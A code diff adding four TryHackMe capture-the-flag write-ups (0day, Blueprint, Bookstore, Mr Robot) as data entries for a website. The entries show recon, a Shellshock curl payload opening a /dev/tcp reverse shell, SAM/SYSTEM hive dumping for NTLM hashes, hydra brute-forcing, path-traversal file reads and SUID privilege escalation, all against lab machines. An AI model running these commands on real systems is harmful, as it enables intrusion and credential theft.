@@ -582,4 +582,390 @@ export const writeups: Record<string, WriteupData> = {
       { type: "callout", content: "Final takeaways: Registration endpoints matter — if the server trusts client JSON fields, roles can be self-assigned • SSRF unlocks internal-only docs + admin APIs • SSTI is a fast escalation chain: reflection → evaluation → RCE → shell • Erlang cookie is critical: once leaked, RabbitMQ internals become reachable." },
     ],
   },
+"0day": {
+  title: "0day",
+  meta: "TryHackMe • Linux • Easy",
+  slug: "0day",
+  baseImageUrl: "/labs/Tryhackme/0day/",
+  sections: [
+    { type: "heading", content: "0) Questions:" },
+    { type: "list", content: "", items: ["user.txt", "root.txt"] },
+
+    { type: "heading", content: "1) nmap" },
+    { type: "image", content: "Pasted image 20260222170533.png", alt: "Initial recon / landing page" },
+    { type: "text", content: "The landing page didn’t really have anything useful, so I went straight to recon. I ran Nmap first, and at the same time I planned to do web enumeration with FFUF." },
+    { type: "code", content: "nmap -T4 -p- -A -r -Pn -v -sV -oN scan.nmap  10.114.170.191" },
+    { type: "image", content: "Pasted image 20260222170755.png", alt: "Nmap output" },
+    { type: "text", content: "Nothing obvious came out of the scan for a quick win, so I focused on finding hidden web paths." },
+    { type: "callout", content: "Pointer: If the main page looks boring, don’t overthink it — fuzz for hidden paths early. CTF boxes love hiding the real entry under /cgi-bin, /admin, /backup, etc." },
+
+    { type: "heading", content: "2) ffuf" },
+    { type: "text", content: "Directory fuzzing to see what’s actually exposed on the web server:" },
+    { type: "code", content: "ffuf -u 'http://10.114.170.191/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -e .html,.txt,.php -s" },
+    { type: "image", content: "Pasted image 20260222170900.png", alt: "FFUF results" },
+    { type: "text", content: "FFUF gave a few quick hits:" },
+    { type: "code", content: "/cgi-bin/ - 404 Forbidden\n/admin/ - Returns blank page\n/backup/ - RSA Private key, We cant use it\n/uploads/ - Returns blank pag\n/secret/ - Returns an image, But its useless, I tried to check it but no luck, (Binwalk/ metadata/ strings, etc)\n/robots.txt - \"You really thought it'd be this easy?\"" },
+    { type: "callout", content: "Pointer: Any mention of /cgi-bin is a big hint. Even if it says forbidden, it’s still worth checking for old CGI bugs (Shellshock is a classic)." },
+
+    { type: "heading", content: "3) nikto" },
+    { type: "text", content: "At this point I ran Nikto just to see if it flags anything obvious on the web server." },
+    { type: "code", content: "nikto -h 10.114.170.191" },
+    { type: "image", content: "Pasted image 20260222172239.png", alt: "Nikto scan output" },
+    { type: "text", content: "Nikto showed a Shellshock finding, so I checked exploits with searchsploit and tried a working payload against the target." },
+    { type: "image", content: "Pasted image 20260222172550.png", alt: "Searchsploit results for Shellshock" },
+    { type: "image", content: "Pasted image 20260222172601.png", alt: "Shellshock exploit details" },
+    { type: "image", content: "Pasted image 20260222172708.png", alt: "Shellshock working against the target" },
+    { type: "callout", content: "Pointer: Before going straight for a shell, test with something safe like `id` / `whoami`. If you get output back, then upgrade to a reverse shell." },
+
+    { type: "heading", content: "4) Reverse shell" },
+    { type: "text", content: "Once I confirmed Shellshock works, I used a curl User-Agent payload to pop a reverse shell." },
+    { type: "code", content: "curl -A \"() { :; }; echo; /bin/bash -i >& /dev/tcp/192.168.141.103/1236 0>&1\" http://10.114.170.191/cgi-bin/test.cgi" },
+    { type: "image", content: "Pasted image 20260222173003.png", alt: "Reverse shell curl request" },
+    { type: "image", content: "Pasted image 20260222173025.png", alt: "Reverse shell session" },
+    { type: "text", content: "After the shell landed, I grabbed the user flag (user.txt)." },
+    { type: "callout", content: "Pointer: If the shell feels unstable, upgrade it (pty spawn) before doing privesc. It saves a lot of pain later." },
+
+    { type: "heading", content: "5) Privilege Escalation" },
+    { type: "text", content: "For privesc, I just went with linpeas.sh to get a quick list of potential vectors." },
+    { type: "text", content: "Transferred it using netcat:" },
+    { type: "code", content: "Local machine: nc 10.114.170.191 4444 < linpeas.sh \nVictim machine: nc -lp 4444 > linpeas.sh" },
+    { type: "image", content: "Pasted image 20260222173306.png", alt: "Transferring linpeas.sh" },
+    { type: "image", content: "Pasted image 20260222173349.png", alt: "linpeas output / findings" },
+    { type: "text", content: "linpeas pointed me to this exploit: `https://www.exploit-db.com/exploits/37292`. I grabbed it and transferred it over with ncat." },
+    { type: "image", content: "Pasted image 20260222174417.png", alt: "Exploit transferred to the target" },
+
+    { type: "text", content: "When I tried compiling it, I hit an error (PATH issue)." },
+    { type: "image", content: "Pasted image 20260222174456.png", alt: "Compile error" },
+    { type: "text", content: "Fix was just setting a proper PATH:" },
+    { type: "code", content: "export PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/sbin:/bin:/sbin" },
+    { type: "image", content: "Pasted image 20260222174811.png", alt: "PATH fixed" },
+    { type: "callout", content: "Pointer: If something “should compile” but doesn’t, check the boring stuff first (PATH, missing gcc/make, permissions). It’s usually that." },
+
+    { type: "text", content: "After that, the exploit worked and I was able to read root.txt." },
+    { type: "image", content: "Pasted image 20260222175028.png", alt: "Root flag" },
+  ],
+},
+
+"blueprint": {
+  title: "Blueprint",
+  meta: "TryHackMe • Linux • Easy",
+  slug: "blueprint",
+  baseImageUrl: "/labs/Tryhackme/Blueprint/",
+  sections: [
+    { type: "heading", content: "0)  Questions:" },
+    { type: "list", content: "", items: ["\"Lab\" user NTLM hash decrypted", "root.txt"] },
+
+    { type: "heading", content: "1) NMAP:" },
+    { type: "text", content: "Started with a full port scan to see what’s exposed." },
+    { type: "code", content: "nmap -T4 -p- -A -r -Pn -v -sV -oN scan.nmap  10.113.179.206" },
+
+    { type: "text", content: "Open ports found:" },
+    { type: "code", content: "Discovered open port 80/tcp on 10.113.179.206\nDiscovered open port 135/tcp on 10.113.179.206\nDiscovered open port 139/tcp on 10.113.179.206\nDiscovered open port 443/tcp on 10.113.179.206\nDiscovered open port 445/tcp on 10.113.179.206\nDiscovered open port 3306/tcp on 10.113.179.206\nDiscovered open port 8080/tcp on 10.113.179.206\nDiscovered open port 49152/tcp on 10.113.179.206\nDiscovered open port 49153/tcp on 10.113.179.206\nDiscovered open port 49154/tcp on 10.113.179.206\nDiscovered open port 49158/tcp on 10.113.179.206\nDiscovered open port 49160/tcp on 10.113.179.206\nDiscovered open port 49159/tcp on 10.113.179.206" },
+
+    { type: "text", content: "The most interesting one was port 8080. Version detection showed it was HTTP and it had a directory listing with osCommerce files." },
+    { type: "code", content: "8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)\n| http-methods: \n|   Supported Methods: OPTIONS GET HEAD POST TRACE\n|_  Potentially risky methods: TRACE\n|_http-title: Index of /\n| http-ls: Volume /\n| SIZE  TIME              FILENAME\n| -     2019-04-11 22:52  oscommerce-2.3.4/\n| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/\n| -     2019-04-11 22:52  oscommerce-2.3.4/docs/" },
+
+    { type: "callout", content: "Pointer: If you see \"Index of /\" plus a clear app/version (osCommerce 2.3.4 here), don’t guess. Search exploits for that exact version and try those first." },
+    { type: "callout", content: "Pointer: Ports 135/139/445 usually mean Windows/SMB. Even if web gets you in, it’s useful later for credential dumping and post-exploitation." },
+
+    { type: "heading", content: "2) Remote code execution, Into rev shell" },
+    { type: "text", content: "I checked port 8080 first. The catalog folder looked like the actual site, and since we already knew the CMS (osCommerce), I used searchsploit." },
+    { type: "image", content: "Pasted image 20260222141217.png", alt: "Searching for osCommerce exploits" },
+
+    { type: "text", content: "There were multiple vulnerabilities listed (file upload and RCE). I went with RCE first. If that didn’t work, I planned to fall back to file upload." },
+    { type: "text", content: "Pulled the exploit locally:" },
+    { type: "code", content: "searchsploit -m php/webapps/44374.py" },
+    { type: "image", content: "Pasted image 20260222141534.png", alt: "Exploit copied locally" },
+
+    { type: "text", content: "Then I edited it to match the target. The main thing was fixing the base URL so it points to the box on port 8080." },
+    { type: "code", content: "10.113.179.206:8080" },
+
+    { type: "text", content: "So it goes from:" },
+    { type: "image", content: "Pasted image 20260222141637.png", alt: "Exploit before editing base URL" },
+    { type: "text", content: "To:" },
+    { type: "image", content: "Pasted image 20260222141739.png", alt: "Exploit after editing base URL" },
+
+    { type: "text", content: "That one didn’t work as planned, so I tried the second RCE option instead." },
+    { type: "image", content: "Pasted image 20260222142035.png", alt: "Second RCE attempt" },
+
+    { type: "text", content: "This time it worked and I got a shell. Even better, it dropped me in as Administrator." },
+    { type: "image", content: "Pasted image 20260222142148.png", alt: "Shell gained as Administrator" },
+
+    { type: "callout", content: "Pointer: If you land a shell and it’s already high-privileged, confirm it (whoami) and then grab what you need quickly (flags + creds) before you start experimenting." },
+
+    { type: "heading", content: "3) Inside the system" },
+    { type: "text", content: "Since I was already Administrator, the root flag was basically done. The main remaining task was extracting the \"Lab\" user NTLM hash and decrypting it." },
+
+    { type: "text", content: "I used the standard SAM/SYSTEM/SECURITY hive method using reg.exe:" },
+    { type: "code", content: "C:\\> reg.exe save hklm\\sam c:\\temp\\sam.save\nC:\\> reg.exe save hklm\\security c:\\temp\\security.save\nC:\\> reg.exe save hklm\\system c:\\temp\\system.save" },
+
+    { type: "image", content: "Pasted image 20260222143413.png", alt: "Saving registry hives (SAM)" },
+    { type: "image", content: "Pasted image 20260222143422.png", alt: "Saving registry hives (SECURITY/SYSTEM)" },
+    { type: "text", content: "After running those, I had all three files saved." },
+    { type: "image", content: "Pasted image 20260222143627.png", alt: "All three hive files created" },
+
+    { type: "text", content: "Then I downloaded them through the website using this path:" },
+    { type: "code", content: "/catalog/install/includes" },
+    { type: "image", content: "Pasted image 20260222143643.png", alt: "Downloading saved hives via the web directory" },
+
+    { type: "callout", content: "Pointer: If SMB copy is annoying or blocked, exfil via a reachable web directory works fine. Just don’t overwrite anything the app needs." },
+
+    { type: "text", content: "After downloading the hives, I used secretsdump to extract the hashes." },
+    { type: "code", content: "wget https://github.com/fin3ss3g0d/secretsdump.py/blob/main/secretsdump.py" },
+    { type: "image", content: "Pasted image 20260222143944.png", alt: "secretsdump extracting hashes" },
+
+    { type: "text", content: "That gave me the \"Lab\" user hash. The question wanted it decrypted, so I tried CrackStation first (if it failed, I would’ve switched to hashcat or john)." },
+    { type: "image", content: "Pasted image 20260222144121.png", alt: "CrackStation cracking the NTLM hash" },
+    { type: "text", content: "Luckily, CrackStation worked, so that finished the first question." },
+
+    { type: "callout", content: "Pointer: Always try the easy stuff first (CrackStation / common wordlists). If it doesn’t crack fast, move to hashcat with rules or masks." },
+
+    { type: "heading", content: "4) root.txt" },
+    { type: "image", content: "Pasted image 20260222145358.png", alt: "Root flag location on Administrator desktop" },
+    { type: "text", content: "Root flag:" },
+    { type: "code", content: "more C:\\users\\Administrator\\Desktop\\root.txt.txt\n\nTHM{aea1e3ce6fe7f89e10cea833ae009bee}" },
+
+  ],
+},
+
+"bookstore": {
+  title: "Bookstore",
+  meta: "TryHackMe • Linux • Medium",
+  slug: "bookstore",
+  baseImageUrl: "/labs/Tryhackme/Bookstore/",
+  sections: [
+    { type: "heading", content: "0) Questions:" },
+    { type: "list", content: "", items: ["User flag", "Root flag", "Target: 10.114.188.53"] },
+
+    { type: "heading", content: "1) NMAP" },
+    { type: "text", content: "As usual, I started with Nmap (and planned to run FFUF alongside it). I wanted a full port picture first so I don’t miss any weird web/API ports." },
+    { type: "code", content: "nmap -T4 -p- -A -r -Pn -v -sV -oN scan.nmap 10.114.188.53" },
+    { type: "text", content: "Quick flag context (just so it’s clear what I’m doing):" },
+    { type: "code", content: "-T4   : faster timing\n-p-   : scan all TCP ports\n-A    : aggressive scan (scripts + OS detection; sometimes you can skip it)\n-r    : scan ports in order\n-Pn   : skip ping/host discovery\n-v    : verbose output\n-sV   : service/version detection\n-oN   : save output to a file" },
+    { type: "text", content: "Nmap came back with 5 open ports." },
+    { type: "image", content: "Pasted image 20260222150849.png", alt: "Nmap results showing open ports" },
+    { type: "text", content: "One thing immediately stood out: port 5000 had an API route, so I knew I’d probably end up spending time there. Before clicking around too much, I fuzzed both web ports (80 and 5000)." },
+    { type: "callout", content: "Pointer: If you see a second web port (like 5000), treat it like a separate app. Fuzz it separately and don’t assume it has the same routes as port 80." },
+
+    { type: "heading", content: "2) FFUF" },
+    { type: "text", content: "I fuzzed both ports using the same wordlist and a few common extensions." },
+    { type: "code", content: "ffuf -u http://10.114.188.53/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .txt,.html,.php -s\n\nffuf -u http://10.114.188.53:5000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -e .txt,.html,.php -s" },
+
+    { type: "text", content: "Port 80 gave me a few hits: a login page plus static folders (images and assets)." },
+    { type: "image", content: "Pasted image 20260222151916.png", alt: "FFUF results on port 80 (login.html, images, assets)" },
+
+    { type: "text", content: "I checked the login page first." },
+    { type: "image", content: "Pasted image 20260222152142.png", alt: "login.html page" },
+    { type: "text", content: "It felt like a dead-end: register didn’t work, I didn’t have creds, and basic SQL injection attempts didn’t go anywhere." },
+
+    { type: "text", content: "So I did the boring-but-useful thing: checked page source." },
+    { type: "image", content: "Pasted image 20260222152155.png", alt: "Page source hint pointing to assets" },
+    { type: "text", content: "The images folder didn’t matter, but the assets folder ended up being the real lead." },
+    { type: "callout", content: "Pointer: If login is a dead-end, check the JS. Frontend code leaks API routes and sometimes even security comments (like old vulnerable endpoints)." },
+
+    { type: "heading", content: "3) Trying to get into login" },
+    { type: "text", content: "Inside the assets folder, I checked the JS files and found one called api.js." },
+    { type: "image", content: "Pasted image 20260222152403.png", alt: "assets/js showing api.js" },
+    { type: "text", content: "At first I thought it would just repeat what Nmap already told me (host + port). But the file contents were actually useful." },
+    { type: "image", content: "Pasted image 20260222152440.png", alt: "api.js contents showing API structure and comments" },
+
+    { type: "text", content: "The important part was a comment at the end saying the previous API version had a parameter that caused a local file inclusion / arbitrary file read issue. That was basically my next objective: find the old API version and abuse it to read a file." },
+    { type: "text", content: "Since I already fuzzed port 5000, I checked those results next." },
+    { type: "image", content: "Pasted image 20260222152627.png", alt: "FFUF results on port 5000 showing a console route" },
+
+    { type: "text", content: "There was a console endpoint. When I opened it, it asked for a PIN." },
+    { type: "image", content: "Pasted image 20260222152746.png", alt: "Console page asking for a PIN" },
+
+    { type: "text", content: "So the plan was simple:" },
+    { type: "list", content: "", items: [
+      "Find the old API version + the vulnerable parameter that allows arbitrary file read",
+      "Use it to read sid’s bash history and grab the PIN",
+      "Use the PIN to get into the console"
+    ]},
+
+    { type: "heading", content: "4) API Enumeration" },
+    { type: "text", content: "Visiting the API root shows the public structure, but it didn’t look like the full story (usually full APIs are documented more cleanly or returned as JSON)." },
+    { type: "image", content: "Pasted image 20260222152914.png", alt: "API structure page on port 5000" },
+    { type: "text", content: "I started poking the versioned paths. I also noticed requests referencing v2, so I tried to find which older version still existed." },
+
+    { type: "text", content: "I tried fuzzing the parameter name while attempting a file read payload (aiming at sid’s bash history):" },
+    { type: "code", content: "ffuf -u 'http://10.114.188.53:5000/api/v2/resources/books?FUZZ=../../../home/sid/.bash_history' -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -s" },
+
+    { type: "text", content: "That didn’t immediately give me what I wanted, so I stepped back and looked at the path again. The v2 part stood out." },
+    { type: "text", content: "I tried older versions (v1 / v0), and that was the right move — I found another endpoint quickly." },
+    { type: "image", content: "Pasted image 20260222155007.png", alt: "Finding the older API version endpoint" },
+
+    { type: "text", content: "From there, I used the file read to pull the bash history and got the PIN." },
+    { type: "image", content: "Pasted image 20260222155112.png", alt: "File read output showing the PIN in bash history" },
+    { type: "callout", content: "Pointer: When APIs are versioned, always try older versions. It’s super common for v2 to be patched while v1/v0 is still deployed." },
+    { type: "text", content: "PIN found:" },
+    { type: "code", content: "123-321-135" },
+
+    { type: "heading", content: "5) Reverse shell" },
+    { type: "text", content: "With the PIN, I could finally access the console." },
+    { type: "image", content: "Pasted image 20260222155223.png", alt: "Console unlocked with PIN" },
+
+    { type: "text", content: "The console runs Python expressions in the application context (basically an eval box). That’s enough to get code execution, so I grabbed a Python reverse shell payload from revshells and used it there." },
+    { type: "image", content: "Pasted image 20260222155403.png", alt: "Python reverse shell payload used in console" },
+
+    { type: "text", content: "That dropped me into a shell as the sid user." },
+    { type: "image", content: "Pasted image 20260222155601.png", alt: "Shell as sid + user flag" },
+    { type: "callout", content: "Pointer: If a web console says “expressions in app context”, assume it’s dangerous. Even limited eval usually leads to full RCE if you can import os/subprocess or reach builtins." },
+
+    { type: "heading", content: "6) Privilege escalation" },
+    { type: "text", content: "While enumerating as sid, I noticed a file named try-harder. It was owned by root and it’s an ELF binary, so I pulled it locally and opened it in Ghidra." },
+    { type: "image", content: "Pasted image 20260222160022.png", alt: "try-harder binary analysis in Ghidra" },
+
+    { type: "text", content: "Ghidra showed a simple check: if the calculated value matches the hex value 0x5dcd21f4, it runs a privileged action (root shell)." },
+    { type: "text", content: "The flow was basically:" },
+    { type: "list", content: "", items: [
+      "It sets a value (local_18) to 0x5db3",
+      "It reads our number into a variable (local_1c)",
+      "Then it computes something like: (our_input XOR 0x1116 XOR 0x5db3)",
+      "If the result equals 0x5dcd21f4 → we win"
+    ]},
+
+    { type: "text", content: "This is just XOR math. Since XOR is reversible, we can solve for the input:" },
+    { type: "code", content: "Input = 0x5dcd21f4 ^ 0x1116 ^ 0x5db3" },
+    { type: "callout", content: "Pointer: XOR is your friend here. If the program does (input ^ A ^ B) == TARGET, then input == TARGET ^ A ^ B." },
+
+    { type: "text", content: "I used a tiny Python snippet to calculate the exact number to enter:" },
+    { type: "code", content: "magic_number = 0x5dcd21f4\nxor1 = 0x1116\nxor2 = 0x5db3\n\ninp = magic_number ^ xor1 ^ xor2\nprint(inp)" },
+
+    { type: "image", content: "Pasted image 20260222163046.png", alt: "Calculated magic input value" },
+    { type: "text", content: "Entered the computed value into try-harder and it popped root." },
+    { type: "image", content: "Pasted image 20260222163128.png", alt: "Privilege escalation success (root)" },
+    { type: "image", content: "Pasted image 20260222163145.png", alt: "Root flag / proof of root access" },
+  ],
+},
+
+"mr-robot": {
+  title: "Mr Robot",
+  meta: "TryHackMe • Linux • Medium",
+  slug: "mrrobot",
+  baseImageUrl: "/labs/Tryhackme/MrRobot/",
+  sections: [
+    { type: "heading", content: "0) Questions:" },
+    { type: "list", content: "", items: ["What is key 1?", "What is key 2?", "What is key 3?"] },
+
+    { type: "heading", content: "1) Web page" },
+    { type: "image", content: "Pasted image 20260222202116.png", alt: "Landing page" },
+    { type: "text", content: "The landing page didn’t really show anything useful, so I moved on to recon and directory fuzzing." },
+    { type: "callout", content: "Pointer: If the homepage is empty or just a theme page, don’t waste time — scan + fuzz early." },
+
+    { type: "heading", content: "2) nmap" },
+    { type: "code", content: "nmap -T4 -p- -A -r -v -sV -oN scan.nmap 10.114.186.95" },
+    { type: "image", content: "Pasted image 20260222202806.png", alt: "Nmap results" },
+    { type: "text", content: "Nmap didn’t give me anything immediately exploitable, so the next step was web enumeration." },
+
+    { type: "heading", content: "3) ffuf" },
+    { type: "code", content: "ffuf -u 'http://10.114.186.95/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -e .html,.txt,.php -s" },
+    { type: "text", content: "FFUF was way more useful here than Nmap." },
+    { type: "image", content: "Pasted image 20260222202937.png", alt: "FFUF results showing many hits" },
+    { type: "text", content: "I got a bunch of hits right away, and it was clear this was WordPress." },
+
+    { type: "text", content: "First thing I did was check the WordPress login page and see how it responds." },
+    { type: "image", content: "Pasted image 20260222203104.png", alt: "WordPress login error output" },
+    { type: "text", content: "With random credentials, the error message leaks useful info. If the site tells you whether the username is valid, you can split the job into two steps: find a real username first, then attack the password for only that user." },
+    { type: "callout", content: "Pointer: When a login page returns different errors for “invalid username” vs “wrong password”, it’s basically telling you how to do username enumeration." },
+
+    { type: "text", content: "Next I checked robots.txt, and it gave me two more paths to look at." },
+    { type: "image", content: "Pasted image 20260222203527.png", alt: "robots.txt revealing additional paths" },
+    { type: "text", content: "One of those paths led to key 1." },
+    { type: "image", content: "Pasted image 20260222203552.png", alt: "Key 1 found" },
+
+    { type: "text", content: "The other one was a big wordlist file:" },
+    { type: "code", content: "/fsocity.dic" },
+    { type: "image", content: "Pasted image 20260222203709.png", alt: "fsocity.dic contents preview" },
+    { type: "text", content: "I checked the other directories I found, but most were either redirects, forbidden, or just unrelated content. So I used the wordlist for login enumeration." },
+    { type: "callout", content: "Pointer: If a box hands you a wordlist, it usually wants you to use it. Don’t overcomplicate it." },
+
+    { type: "heading", content: "4) Username spray" },
+    { type: "text", content: "Before using Hydra, I downloaded the wordlist locally:" },
+    { type: "code", content: "wget http://10.114.186.95/fsocity.dic" },
+    { type: "image", content: "Pasted image 20260222204735.png", alt: "Downloading fsocity.dic" },
+
+    { type: "text", content: "The list is huge (800k+). Username-spraying that as-is is painful, so I cleaned it up with uniq to remove duplicates first." },
+    { type: "image", content: "Pasted image 20260222205008.png", alt: "Reducing wordlist with uniq" },
+    { type: "callout", content: "Pointer: Always de-duplicate big lists before brute forcing. It saves a lot of time and noise." },
+
+    { type: "text", content: "To build the Hydra command, I needed to see how the login form submits. So I opened the browser dev tools (Network tab), submitted a test login, and watched the request." },
+    { type: "image", content: "Pasted image 20260222204543.png", alt: "Network tab showing POST parameters" },
+    { type: "text", content: "It’s a POST request with two parameters (log and pwd), so I used http-post-form." },
+
+    { type: "text", content: "Username spray (static password, testing usernames):" },
+    { type: "code", content: "hydra -L wordlist -p test 10.114.186.95 http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username\" -t 64 -I -v" },
+    { type: "text", content: "Flags used (quick explanation):" },
+    { type: "code", content: "-L  : username list\n-p  : static password\nhttp-post-form : tells hydra we are posting a login form\nF=  : failure string to detect invalid attempts\n-t  : threads\n-v  : verbose (mainly to see successes)\n-I  : don’t wait between retries / continue cleanly" },
+    { type: "image", content: "Pasted image 20260222210427.png", alt: "Hydra finding a valid username" },
+    { type: "text", content: "That gave me a valid username. Then I flipped it to password brute force with a static username:" },
+
+    { type: "code", content: "hydra -l elliot -P wordlist 10.114.186.95 http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect\" -t 64 -I -v" },
+    { type: "image", content: "Pasted image 20260222211529.png", alt: "Hydra finding the password" },
+    { type: "text", content: "Credentials found:" },
+    { type: "code", content: "elliot:ER28-0652" },
+
+    { type: "heading", content: "4.5) Hidden shortcut (optional)" },
+    { type: "text", content: "You can actually skip most of the spraying. There’s a shortcut: visit the license page and scroll down — it contains a Base64 blob that decodes to the same credentials." },
+    { type: "image", content: "Pasted image 20260222211554.png", alt: "Base64 shown on license page" },
+    { type: "code", content: "ZWxsaW90OkVSMjgtMDY1Mgo=" },
+    { type: "image", content: "Pasted image 20260222211616.png", alt: "Decoded Base64 result" },
+
+    
+    { type: "heading", content: "5) Getting a reverse shell" },
+    { type: "text", content: "After logging in as elliot, I checked if the account had admin rights." },
+    { type: "image", content: "Pasted image 20260222211845.png", alt: "Logged in as elliot" },
+    { type: "image", content: "Pasted image 20260222212343.png", alt: "Users tab showing admin privileges" },
+    { type: "text", content: "It did. Since it’s WordPress admin, the easiest path is editing a theme PHP file and triggering it from the browser." },
+    { type: "image", content: "Pasted image 20260222212504.png", alt: "Editing theme PHP file" },
+
+    { type: "text", content: "I first did a quick echo test to make sure the PHP change executes, then visited the theme file directly:" },
+    { type: "code", content: "http://10.114.186.95/wp-content/themes/Twenty+Fifteen/404.php" },
+    { type: "image", content: "Pasted image 20260222212608.png", alt: "Echo test working in browser" },
+
+    { type: "text", content: "After confirming it runs, I dropped in a reverse shell payload (I used the PHP pentestmonkey one from revshells) and caught the shell." },
+    { type: "image", content: "Pasted image 20260222212752.png", alt: "Reverse shell payload used" },
+    { type: "callout", content: "Note: My attacking machine got terminated around here, so my IP changed mid-way. Same steps, just different callback IP." },
+
+    { type: "text", content: "Once the shell landed, I stabilized it:" },
+    { type: "code", content: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },
+
+    { type: "text", content: "Then I checked home directories." },
+    { type: "image", content: "Pasted image 20260222215102.png", alt: "Checking /home and spotting robot user files" },
+    { type: "text", content: "I couldn’t read key 2 yet, but I found credentials material for the robot user. The hash was MD5, so I cracked it with CrackStation." },
+    { type: "image", content: "Pasted image 20260222215152.png", alt: "CrackStation cracking MD5" },
+    { type: "text", content: "Robot creds:" },
+    { type: "code", content: "robot:abcdefghijklmnopqrstuvwxyz" },
+
+    { type: "text", content: "At this point I had two options: SSH in as robot, or just switch users from the current shell. I went with su." },
+    { type: "image", content: "Pasted image 20260222215412.png", alt: "Switching to robot user" },
+    { type: "text", content: "Then I grabbed key 2." },
+    { type: "image", content: "Pasted image 20260222215444.png", alt: "Key 2 found" },
+    { type: "callout", content: "Pointer: If you already have a shell, su is usually faster than SSH. SSH is nice if your shell is unstable, though." },
+
+    { type: "heading", content: "6) Privilege escalation" },
+    { type: "text", content: "The box was straightforward so far, so I tried manual enumeration first (and kept linpeas as a backup plan)." },
+    { type: "text", content: "Quick checks:" },
+    { type: "list", content: "", items: [
+      "Checked cron (nothing useful)",
+      "Checked environment variables (nothing interesting)",
+      "Checked root processes (nothing useful)"
+    ]},
+    { type: "image", content: "Pasted image 20260222215737.png", alt: "Environment variables check" },
+
+    { type: "text", content: "Then I searched for SUID binaries (root-owned executables that run with elevated privileges):" },
+    { type: "code", content: "find / -perm -4000 -user root -exec ls -ld {} \\; 2> /dev/null" },
+    { type: "image", content: "Pasted image 20260222220206.png", alt: "SUID binaries found" },
+
+    { type: "text", content: "Most of the results were normal, but one stood out: nmap with SUID is not common at all." },
+    { type: "callout", content: "Pointer: If you see an unusual SUID binary, check GTFOBins immediately. That’s usually the intended privesc path." },
+
+    { type: "text", content: "GTFOBins shows how to abuse SUID nmap to get a root shell." },
+    { type: "image", content: "Pasted image 20260222220301.png", alt: "GTFOBins search" },
+    { type: "image", content: "Pasted image 20260222220406.png", alt: "GTFOBins nmap method" },
+    { type: "image", content: "Pasted image 20260222220414.png", alt: "Root shell obtained / key 3" },
+
+    { type: "text", content: "After abusing the SUID nmap method, I got root and grabbed key 3." },
+  ],
+},
 };
